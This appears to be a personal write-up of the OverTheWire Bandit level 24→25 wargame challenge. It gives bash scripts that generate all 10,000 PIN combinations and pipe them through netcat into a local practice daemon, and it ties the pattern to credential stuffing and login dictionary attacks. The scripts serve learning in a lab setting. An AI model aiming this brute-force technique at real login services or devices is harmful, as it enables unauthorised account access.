# Bandit Level 24 → Level 25

**Platform:** OverTheWire  
**Wargame:** Bandit  
**Date Completed:** 2026-05-12  
**Tags:** `brute-force` `bash-scripting` `netcat` `loops` `wordlist-generation`

---

## Objective

A daemon is listening on port 30002. It will return the password for Level 25 only when given the current password followed by a correct 4-digit PIN (0000–9999). There is no way to guess the PIN - you must try all 10,000 combinations.

---

## Concepts Learned

- **Brute-forcing with a wordlist:** Rather than sending one guess at a time interactively, generating all possible inputs as a file and piping the entire wordlist into `nc` in one connection is vastly more efficient. This is the same principle behind password wordlist attacks in tools like `hydra` or `medusa`.
- **`printf` for formatted output:** `printf "%s %04d\n"` formats each line as the password string followed by a zero-padded 4-digit number. The `%04d` specifier pads numbers shorter than 4 digits with leading zeros (e.g. `7` becomes `0007`). This ensures every PIN from 0000 to 9999 is represented correctly.
- **`seq`:** Generates a sequence of numbers. `seq 0 9999` produces every integer from 0 to 9999 inclusive - used here to drive the loop that generates all PIN combinations.
- **Output redirection in a loop (`done > file`):** Redirecting the output of an entire `for` loop to a file with `done > wordlist.txt` is cleaner and more efficient than appending line by line inside the loop. The file is written in one pass once the loop completes.
- **`grep -v`:** Inverts the match - prints every line that does _not_ match the pattern. Piping `nc` output through `grep -v "Wrong"` filters out all the failed attempts and leaves only the success response.
- **Script iteration:** Recognising that two separate steps (generate wordlist, then pipe it) can be combined into one script is a sign of growing scripting maturity. Both approaches are documented here.

---

## Approach

The challenge was clear: 10,000 possible PINs, no way to narrow it down, so brute force was the only option. The question was how to do it efficiently.

**Approach 1 - Two-step (generate then send):**

I wrote a script to generate all 10,000 combinations and save them to `wordlist.txt`. Each line contained the bandit24 password and a zero-padded PIN separated by a space - exactly the format the daemon expected. I verified the wordlist looked correct with `head -5`, `tail -5`, and `wc -l` before using it.

I then piped the wordlist into `nc localhost 30002`. The daemon processed every line and returned responses - mostly "Wrong!" messages - but the correct PIN produced a different response containing the next password. To isolate it I re-ran the command and piped the output through `grep -v "Wrong"`, which filtered out all the failure messages and left only the success line.

**Approach 2 - Combined script:**

After completing the level I realised the generation and submission steps could be merged into a single script. The second version generates the wordlist to a file, then immediately pipes it to `nc` and filters the output - all in one execution.

---

## Commands Used

```bash
# Create and enter a working directory
mkdir /tmp/brutelvl24
cd /tmp/brutelvl24

# --- Approach 1: Two-step ---

# Script: generate.sh
#!/bin/bash
password="<bandit24_password>"
for i in $(seq 0 9999); do
    printf "%s %04d\n" "$password" "$i"
done > wordlist.txt

# Make executable and run
chmod +x generate.sh
./generate.sh

# Verify the wordlist
head -5 wordlist.txt
tail -5 wordlist.txt
wc -l wordlist.txt

# Pipe wordlist into the daemon and filter out wrong answers
nc localhost 30002 < wordlist.txt | grep -v "Wrong"


# --- Approach 2: Combined script ---

# Script: brute.sh
#!/bin/bash
password="<bandit24_password>"
wordlist="/tmp/brutelvl24/wordlist.txt"

# Generate all combinations
for i in $(seq 0 9999); do
    printf "%s %04d\n" "$password" "$i"
done > "$wordlist"

# Send the wordlist and filter for the success response
nc localhost 30002 < "$wordlist" | grep -v "Wrong"

chmod +x brute.sh
./brute.sh
```

---

## Reflection

The progression from Approach 1 to Approach 2 reflects an important habit: after solving a problem, look back and ask whether the steps could be consolidated. A script that handles the entire pipeline - generation, transmission, and filtering - is easier to reuse, share, and adapt for future challenges. That mindset of iterative refinement is what separates functional scripts from professional ones.

---

## Key Takeaway

Scripted brute-forcing is a fundamental offensive security technique. The pattern here - generate a candidate list, pipe it to a service, filter for the success signal - is the same logic underlying credential stuffing attacks, PIN brute-forces against lock screens, and dictionary attacks against login endpoints. Understanding it from first principles, rather than just running a tool, makes you a significantly more effective security practitioner.

---

## References

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
- [Linux man page - `printf`](https://linux.die.net/man/1/printf)
- [Linux man page - `seq`](https://linux.die.net/man/1/seq)
- [Linux man page - `nc`](https://linux.die.net/man/1/nc)
- [Bash manual - Redirections](https://www.gnu.org/software/bash/manual/bash.html#Redirections)
